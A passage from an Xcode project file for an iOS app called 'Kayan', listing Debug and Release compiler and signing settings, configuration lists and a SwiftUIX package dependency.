				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		B1713F3E2611C6C000BCCCEE /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.2;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		B1713F402611C6C000BCCCEE /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 0168A6A5D3AF86E9E7A9BAFD /* Pods-Kayan.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1.0.2;
				DEVELOPMENT_ASSET_PATHS = "\"Kayan/Preview Content\"";
				DEVELOPMENT_TEAM = 46278RZ58D;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = Kayan/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "Ibtikar-soft.com.Kayan";
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		B1713F412611C6C000BCCCEE /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = A8FBDF7F3C56B4C2A84E61F0 /* Pods-Kayan.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1.0.2;
				DEVELOPMENT_ASSET_PATHS = "\"Kayan/Preview Content\"";
				DEVELOPMENT_TEAM = 46278RZ58D;
				ENABLE_PREVIEWS = YES;
				INFOPLIST_FILE = Kayan/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = "Ibtikar-soft.com.Kayan";
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		B1713F262611C6BD00BCCCEE /* Build configuration list for PBXProject "Kayan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				B1713F3D2611C6C000BCCCEE /* Debug */,
				B1713F3E2611C6C000BCCCEE /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		B1713F3F2611C6C000BCCCEE /* Build configuration list for PBXNativeTarget "Kayan" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				B1713F402611C6C000BCCCEE /* Debug */,
				B1713F412611C6C000BCCCEE /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

/* Begin XCRemoteSwiftPackageReference section */
		B1596A8B26130B9E00D06B1A /* XCRemoteSwiftPackageReference "SwiftUIX" */ = {
			isa = XCRemoteSwiftPackageReference;
			repositoryURL = "https://github.com/SwiftUIX/SwiftUIX";
			requirement = {
				kind = upToNextMajorVersion;
				minimumVersion = 0.0.5;
			};
		};
/* End XCRemoteSwiftPackageReference section */

/* Begin XCSwiftPackageProductDependency section */
		B1596A8C26130B9F00D06B1A /* SwiftUIX */ = {
			isa = XCSwiftPackageProductDependency;
			package = B1596A8B26130B9E00D06B1A /* XCRemoteSwiftPackageReference "SwiftUIX" */;
			productName = SwiftUIX;
		};
/* End XCSwiftPackageProductDependency section */
	};
	rootObject = B1713F232611C6BD00BCCCEE /* Project object */;
}
